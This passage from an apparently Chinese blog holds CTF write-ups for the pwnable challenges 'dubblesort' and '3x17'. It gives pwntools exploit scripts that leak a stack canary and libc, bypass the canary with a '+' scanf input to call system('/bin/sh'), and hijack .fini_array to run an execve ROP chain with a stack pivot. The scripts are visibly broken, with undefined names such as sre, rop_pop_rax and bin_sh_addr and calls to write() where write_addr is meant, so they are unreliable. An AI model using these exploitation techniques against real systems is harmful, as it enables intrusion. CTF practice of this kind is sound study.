class=\"keyword\">if</span> ( last_num != <span class=\"number\">-1</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v6 = a1;</span><br><span class=\"line\">        <span class=\"keyword\">do</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          v4 = *v6;</span><br><span class=\"line\">          v5 = v6[<span class=\"number\">1</span>];</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( *v6 &gt; v5 )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            *v6 = v5;</span><br><span class=\"line\">            v6[<span class=\"number\">1</span>] = v4;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          ++v6;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)i != v6 );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !last_num )</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      --last_num;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = __readgsdword(<span class=\"number\">0x14</span>u) ^ v8;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( result )</span><br><span class=\"line\">    sub_BA0();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        基本所有关键的变量都是uint。怪，我记得之前sort里面是有一个强制类型转换的。。。。</p>\n<h1><span id=\"利用\">利用</span></h1><h2><span id> </span></h2><h2><span id=\"一些很乱的做题笔记\">一些很乱的做题笔记</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%884.44.44.png\" alt=\"截屏2022-04-24 下午4.44.44\"></p>\n<p>​        这个题的栈还算清楚，至少找得到东西，没有乱七八糟。可以比较直观地看出d60c开始存着我们的name，然后是八个字节的空字节，这样就基本没有任何通过name leak的可能性了，但是问题不大。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%888.12.56.png\" alt=\"截屏2022-04-24 下午8.12.56\"></p>\n<p>​        进入sort之前，参数在栈中的状态。那么如果溢出最后一个num为一个很大的数会怎样呢。笑死，溢出不了捏。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%888.21.00.png\" alt=\"截屏2022-04-24 下午8.21.00\"></p>\n<p>​        然后进行sort，把参数按照规则交换以后pop到合适的位置。</p>\n<p>​        此外，如果我们在输入name的时候随便输入一些东西，比如1，其实除了1还会打印出一些很奇怪的东西，</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%888.30.10.png\" alt=\"截屏2022-04-24 下午8.30.10\"></p>\n<p>​        我们查看name储存的栈内存，发现确实是有东西的，但是这个值是随机的，但最低位是<code>\\x00</code>，所以只要我们输入一个字节的name就不会影响。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%888.28.51.png\" alt=\"截屏2022-04-24 下午8.28.51\"></p>\n<p>​        这个值是完全随机的，并且末尾是空字节，按照第六感，我就基本上把它看作是canary了。所以通过这一步我们获得了main栈帧的canary。（也许</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;What your name :&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Hello&quot;</span>)</span><br><span class=\"line\">data = p.recv()[<span class=\"number\">1</span>:<span class=\"number\">5</span>]</span><br><span class=\"line\">main_canary = u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x31</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;main_canary =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(main_canary)))</span><br></pre></td></tr></table></figure>\n<p>​    说点有的没的，识别canary并无坑获取这一点虽然非常简单，但是我真的很熟练，可能是我这么熟练，pwncollege要负全责，他那个stack overflow的modlue真的非常之折磨，而我居然全部做完了（</p>\n<p>​    获得canary就比较快乐，但是程序并没有给我们直接的溢出的机会，然而输入num的地址是一个空间有限的数组，所以我们可能可以通过输入比较多的数字来覆盖num 地址之后的指针。</p>\n<p>看样子可行，d61c原本是一个指针，但是现在它是1了。那么现在需要搞清楚这些可以被覆盖的指针分别指向什么，以及覆盖以后如何利用。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-24%20%E4%B8%8B%E5%8D%889.07.50.png\" alt=\"截屏2022-04-24 下午9.07.50\"></p>\n<p>​        输入十个数，栈中情况：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-26%20%E4%B8%8A%E5%8D%8810.41.35.png\" alt=\"截屏2022-04-26 上午10.41.35\"></p>\n<p>​    输入十五个数，栈中情况：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-26%20%E4%B8%8A%E5%8D%8810.42.31.png\" alt=\"截屏2022-04-26 上午10.42.31\"></p>\n<p>​        </p>\n<p>​        粗浅看了一下，感觉并没有特别好的思路，指针确实是被覆盖了，但是如何利用呢？</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-26%20%E4%B8%8A%E5%8D%8810.46.01.png\" alt=\"截屏2022-04-26 上午10.46.01\"></p>\n<p>​    可以被覆盖的指针大致指向这些东西，似乎也没有很好的利用方式。呜呜。</p>\n<p>​    大意了。昨天做pic adc，脑子都麻了没有想到可以直接覆盖空字节来leak栈地址，今天一筹莫展的时候在想为什么程序只给我们一个莫名其妙的canary啊，也没有栈溢出啥的，然后就突然意识到是我脑残了，其实这里就是一个栈的leak，把canary的空字节覆盖掉就好了（</p>\n<p>​        话说这里覆盖掉canary为什么不会smash。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-26%20%E4%B8%8A%E5%8D%8810.54.35.png\" alt=\"截屏2022-04-26 上午10.54.35\"></p>\n<p>​        观察一下就可以看到我们能够leak 空字节前的所有地址，再观察一下可以发现这些地址不仅是栈上的，还有libc上的，这样就相当于可以leak stack和libc了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># leak stack and libc</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;What your name :&quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">data = p.recv()[<span class=\"number\">4</span>:<span class=\"number\">12</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;data =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\">stack_addr = u32(data[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc_addr = u32(data[<span class=\"number\">4</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\">libc_base = libc_addr - libc_offset</span><br><span class=\"line\">onegadget = libc_base + <span class=\"number\">0x4f3d5</span></span><br><span class=\"line\"><span class=\"comment\">#0x4f432</span></span><br><span class=\"line\"><span class=\"comment\">#0x10a41c</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;stack_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(stack_addr)))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-26%20%E4%B8%8A%E5%8D%8811.13.12.png\" alt=\"截屏2022-04-26 上午11.13.12\"></p>\n<p>​        </p>\n<p>​        接下来不是完全没有思路，而是可以用的思路太多，混淆视听了。稍微理一下。</p>\n<ol>\n<li>利用num溢出改变程序执行流,直接跳转到<code>one_gadget</code>。</li>\n<li>劫持num指针，修改其为<code>exit_hook</code>或者什么got表的地址，然后在其中写入<code>one_gadget</code>。</li>\n</ol>\n<p>​        在经过一些尝试之后，确实是可以劫持程序执行流，但是中途会有canary，而我们之前leak canary的方式并不能同时leak libc和stack，所以到这里就没有思路了。</p>\n<p>​        去看了wp，学到一个比较奇特的思路。</p>\n<p>​        就是说我们是通过num的值来覆盖指针，在覆盖返回地址前会遇到canary，而我们的输入函数是利用<code>scanf()</code>，这个函数可以读取非法字符，但是不会将其写在栈上，所以如果我们在canary对应的位置覆盖为非法字符，就能跳过canary，从而实现栈溢出。</p>\n<p>​        所以再次观察栈。</p>\n<p>ebp的地址是0xffffd668，换算成输入的num就是 <code>（（66c - 5ec )/4 ）+ 1 = 33</code></p>\n<p>​        canary 在d4c，也就是第25个数。</p>\n<p>​        所以只需要输入前24个书为1，然后第二十五个数为非法字符。后面全部覆盖成地址就行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-26%20%E4%B8%8B%E5%8D%8811.56.25.png\" alt=\"截屏2022-04-26 下午11.56.25\"></p>\n<p>​        可以看到这里其实已经跳转到one gadget了，但是有点问题，试一下system。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-26%20%E4%B8%8B%E5%8D%8811.25.07.png\" alt=\"截屏2022-04-26 下午11.25.07\"></p>\n<p>​    exp有一些混乱。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">+<span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&quot;./libc_32.so.6&quot;)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib32/libc-2.27.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./dubblesort&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./dubblesort&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_offset = <span class=\"number\">0x6808</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">input_num</span>(<span class=\"params\">num</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;number :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak stack and libc</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;What your name :&quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">data = p.recv()[<span class=\"number\">4</span>:<span class=\"number\">12</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;data =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">stack_addr = u32(data[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc_addr = u32(data[<span class=\"number\">4</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\">libc_base = libc_addr - libc_offset</span><br><span class=\"line\">onegadget = libc_base + <span class=\"number\">0x3d1b3</span><span class=\"comment\">#0xf7ff61b3</span></span><br><span class=\"line\"><span class=\"comment\">#0x3d1b9</span></span><br><span class=\"line\"><span class=\"comment\">#0x3d1c0</span></span><br><span class=\"line\"><span class=\"comment\">#0x67bdf</span></span><br><span class=\"line\"><span class=\"comment\">#0x67be0</span></span><br><span class=\"line\"><span class=\"comment\">#0x137dae </span></span><br><span class=\"line\"><span class=\"comment\">#0x137daf</span></span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\"><span class=\"comment\">#bin_sh_addr = libc_base + libc.symbols[&quot;str_bin_sh&quot;]</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;system&#x27;</span>, system_addr)</span><br><span class=\"line\">bin_sh_addr = libc_base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;stack_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(stack_addr)))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;bin_sh_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(bin_sh_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#log.success(&quot;onegadget =&gt; &#123;&#125;&quot;.format(hex(onegadget)))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overflow to hijack the execute stream </span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;35&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">    input_num(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;+&#x27;</span>)<span class=\"comment\">#25</span></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>):</span><br><span class=\"line\">    input_num(system_addr)<span class=\"comment\">#34</span></span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"built_in\">str</span>(bin_sh_addr))<span class=\"comment\">#35</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​    这里libc的地址总感觉不对，每次都会跳到一个非常奇怪的地方，然后如果换成题目给的libc的话整个栈又完全变了，就很恼火。</p>\n","categories":["Binary_security"],"tags":["STACK - Other"]},{"title":"pwnable - 3x17","url":"/2022/04/27/week9_3.1_3x17/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-aJcekMju\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8A%E5%8D%8811.44.59.png\" alt=\"截屏2022-04-27 上午11.44.59\"></p>\n<p>​        轻松快乐的栈题，没有canary和pie那估计就是rop力。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8A%E5%8D%8811.48.26.png\" alt=\"截屏2022-04-27 上午11.48.26\"></p>\n<p>​        怪耶。</p>\n<p>​        居然是静态链接捏，那就不是ret2libc力。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8B%E5%8D%882.24.17.png\" alt=\"截屏2022-04-27 下午2.24.17\"></p>\n<h1><span id=\"reverse\">Reverse</span></h1><p>​    开幕雷击</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8B%E5%8D%881.45.04.png\" alt=\"截屏2022-04-27 下午1.45.04\"></p>\n<p>​    这是啥？</p>\n<p>​    秉持着看不懂就假装没有看到的原则，先看看得懂的地方。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">result = ++::result;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( ::result == <span class=\"number\">1</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  my_write(<span class=\"number\">1u</span>, <span class=\"string\">&quot;addr:&quot;</span>, <span class=\"number\">5uLL</span>);</span><br><span class=\"line\">  my_scanf(<span class=\"number\">0</span>, buf, <span class=\"number\">0x18</span>uLL);</span><br><span class=\"line\">  addr = mem_set(buf);<span class=\"comment\">//不知道这是个什么函数，暂且叫做mem set。</span></span><br><span class=\"line\">  my_write(<span class=\"number\">1u</span>, <span class=\"string\">&quot;data:&quot;</span>, <span class=\"number\">5uLL</span>);</span><br><span class=\"line\">  my_scanf(<span class=\"number\">0</span>, addr, <span class=\"number\">0x18</span>uLL);</span><br><span class=\"line\">  result = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        可以看到程序提供了一个任意地址写。一次最多写24字节，并且正常情况下只能写一次。所以其实其他的那些恶心的伪代码暂时可以忽略掉了，这里一个任意地址写就已经足够了。</p>\n<p>​        突然意识到其实这个就是main函数，因为之前那个调用了非常多参数的函数其实是start函数。一般来说题目都会提供符号表，所以以前做题就直接点进main函数从而忽略start函数的其他参数了，以至于这里去除掉符号表后一下没有反应过来，看完了逻辑才后知后觉这里就是main函数。</p>\n<p>​        ps：对于没有符号表的动态链接程序，需要判断函数我一般是直接动调对比，但是如果是静态链接的话似乎也没有什么用，这里学到一种新的方式，就是利用flirt功能，但是十分可惜先进的ida7.7并没有安装这个插件。关于flirt，可以看看这个<a href=\"https://hex-rays.com/products/ida/tech/flirt/in_depth/。这篇guide？从flirt的构思到实现，非常细致地向我们介绍了flirt这个功能，感觉都可以拿去参加技术分享演讲了，反正我是抱着好玩的心思看完了，当阅读练习了，话说如果是母语的话这个体量认真看并理解也就是十分钟吧。但是English要看二十多分钟捏。\">https://hex-rays.com/products/ida/tech/flirt/in_depth/。这篇guide？从flirt的构思到实现，非常细致地向我们介绍了flirt这个功能，感觉都可以拿去参加技术分享演讲了，反正我是抱着好玩的心思看完了，当阅读练习了，话说如果是母语的话这个体量认真看并理解也就是十分钟吧。但是English要看二十多分钟捏。</a></p>\n<blockquote>\n<p>​        </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">A signature file contains patterns of standard runtime functions. </span><br><span class=\"line\">With their help, IDA is able to recognize the standard functions and names them accordingly.</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>​        如果有了sig文件，ida就能识别每个函数的名字。</p>\n<h1><span id=\"还是杂乱无章的做题笔记\">还是杂乱无章的做题笔记</span></h1><p>​        想到哪写哪捏。</p>\n<p>​        任意地址写，很多时候想到的都是覆盖got表或者hook，栈题hook用得比较少，那就可以覆盖got，再不济可以覆盖栈中的返回地址为后门地址。</p>\n<p>​        跳转getshell的部分其实比较简单，但是如何leak后门地址呢？并且这里任意地址地址写应该只能利用一次。一次只能写0x18个字节，很显然仅靠这一次任意地址写我们啥都做不了。</p>\n<p>​        但是感觉也没有特别好的方法能够多次写入，于是到这里就没有思路了。</p>\n<p>​        所以我去看了wp，又学到了新知识。</p>\n<p>​        ps:我在看wp的时候发现有个师傅废话比我还多，有一点欣慰（bushi</p>\n<p>​        太长不看：在64位静态链接的程序下，<code>libc_csu_fini</code>会将程序接下来需要指行的函数保存在<code>.fini.array</code>数组，并且是逆序执行，比如先执行<code>.fini.array[1]</code>,再执行<code>.fini.array[0]</code>，这个<code>.fini.array</code>数组的地址是写可以比较容易获得并且可写的，所以如果我们能覆盖这个数组，就能够进行程序执行流劫持，甚至栈迁移。</p>\n<p>​        唔，这道题确实学到很多新知识，之前其实也有了解过main函数执行之前的一些操作，但是都是没有针对性地笼统了解，现在题目摆在我面前，不去深入了解就没有办法理解题目捏。</p>\n<p>​        所以这里参考了<a href=\"https://www.freebuf.com/articles/system/226003.html\">详解64位静态编译程序的fini_array劫持及ROP攻击</a></p>\n<p>​        反观我们开始的start函数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">sub_401EB0(main, v4, &amp;retaddr, csu_init, csu_fini, a3, &amp;v5);</span><br></pre></td></tr></table></figure>\n<p>​        大概就是这样。</p>\n<p>​        然后看csu fini</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8A%E5%8D%889.15.22.png\" alt=\"截屏2022-04-28 上午9.15.22\"></p>\n<p>​        这里比较关键的操作就是将<code>.fini_array</code>的地址保存在rbp中，然后在后面调用了<code>.fini_array</code>内保存的函数。</p>\n<p>​        可以利用elfheader直接查看</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8A%E5%8D%889.18.34.png\" alt=\"截屏2022-04-28 上午9.18.34\"></p>\n<p>​        可以看到确实0f0-100的范围内出现了两个函数指针。</p>\n<p>​                </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8B%E5%8D%888.48.56.png\" alt=\"截屏2022-04-28 下午8.48.56\">    </p>\n<p>​        然后这里就是一个很逆天的操作，如果我们把    <code>.fini_array[1]</code>覆盖成某个我们想要跳转执行的函数A。然后<code>.fini_array[0]</code>覆盖为<code>libc_csu_fini</code>的地址，那么就会出现这样一种情况。</p>\n<p>​        当main函数第一次执行完，返回到start，调用<code>libc_csu_fini</code>，这个函数会执行<code>.fini_array[1]</code>，也就是我们刚刚覆盖的函数A。等待函数A执行完毕之后，返回到<code>libc_csu_fini</code>，然后继续调用<code>.fini_array[0]</code>，也就是<code>libc_csu_fini</code>。而这个函数又重新执行函数A，返回，再执行自己，以此周而复始，可以说如果<code>.fini_array[0]</code>一直是<code>libc_csu_fini</code>的地址，那么这个循环就会一直进行下去。</p>\n<p>​        所以只要我们把<code>.fini_array[0]</code>覆盖为<code>libc_csu_fini</code>的地址，并且把<code>.fini_array[1]</code>覆盖可以任意地址写的地址，就可以无限写入数据了，我们就正好可以写rop链。</p>\n<p>​        这个操作完成之后，就只需要考虑在哪里写入rop链了。我们要同时满足地址可写并且可执行，还需要劫持执行流到写入rop的地方，这里看起来非常简单，因为我们有一个非常无敌的任意地址写，但是实际上如果我们随便找某一个可写的地址写入rop链的话，栈指针将完全不能利用，rop也是无稽之谈，所以我们必须进行栈迁移，将栈劫持到写入rop的地方。</p>\n<p>​        关于如何利用<code>libc_csu_fini</code>实现栈迁移，其实也是有一定可讲的地方。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8B%E5%8D%889.31.23.png\" alt=\"截屏2022-04-28 下午9.31.23\"></p>\n<p>​        还是回到这一串汇编，这里fini为了调用fini array，将fini array的值保存在rbp中，因此我们可以通过控制fini array从而控制rbp，再借用leave ret一类的gadget进行栈迁移。</p>\n<p>​        这里就站在巨人的肩膀上，直接借用wp中的思路，将rop链写在array + 0x10上，然后劫持到fini上，就能直接执行rop链。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./3x17&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&quot;111.200.241.244&quot;,62729)</span></span><br><span class=\"line\"></span><br><span class=\"line\">fini_addr = <span class=\"number\">0x4B40F0</span></span><br><span class=\"line\">main_addr = <span class=\"number\">0x401B6D</span> </span><br><span class=\"line\">start_addr = <span class=\"number\">0x4B4100</span></span><br><span class=\"line\">libc_csu_fini = <span class=\"number\">0x402960</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#------rop-gadget-------</span></span><br><span class=\"line\"></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x401C4B</span></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x41e4af</span></span><br><span class=\"line\">pop_edi = <span class=\"number\">0x401696</span></span><br><span class=\"line\">pop_esi = <span class=\"number\">0x406c30</span></span><br><span class=\"line\">pop_edx = <span class=\"number\">0x446e35</span></span><br><span class=\"line\">syscall_addr = <span class=\"number\">0x471db5</span></span><br><span class=\"line\">binsh_addr = <span class=\"number\">0x4B4600</span></span><br><span class=\"line\">sys_read_addr = <span class=\"number\">0x446E2C</span></span><br><span class=\"line\">rop_addr = <span class=\"number\">0x4b4100</span> <span class=\"comment\">#fini array + 0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write_addr</span>(<span class=\"params\">addr,data</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;addr:&quot;</span>)</span><br><span class=\"line\">\tp.send((sre(addr)))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;data:&quot;</span>)</span><br><span class=\"line\">\tp.send(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#hajick the fini array to loop the write operation</span></span><br><span class=\"line\"></span><br><span class=\"line\">write_addr(fini_addr,libc_csu_fini)</span><br><span class=\"line\">write_addr(fini_addr + <span class=\"number\">0x8</span>,main_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#write rop chain in the fini + 0x10 </span></span><br><span class=\"line\">write(bin_sh_addr,<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">write(rop_addr,p64(rop_pop_rax))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">8</span>,p64(<span class=\"number\">0x3b</span>))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">16</span>,p64(rop_pop_rdi))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">24</span>,p64(bin_sh_addr))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">32</span>,p64(rop_pop_rdx))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">40</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">48</span>,p64(rop_pop_rsi))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">56</span>,p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">write(rop_addr+<span class=\"number\">64</span>,p64(rop_syscall))</span><br><span class=\"line\">write(fini_array,p64(leave_ret)) <span class=\"comment\"># overwrite the fini[0] to leave_ret addr to pivot the stack.when execute the leave ,rsp = rbp = fini array[0],then pop rbp,so the rsp is fini array[1],finally,ret with rip = rsp = fini array[2] = rop.</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        如果在write函数中不加<code>p.recv()</code>，interactive的时候就会被疯狂轰炸以至于拿不到flag。</p>\n<p>​        不加recv大概是这样。</p>\n<p>​        <img 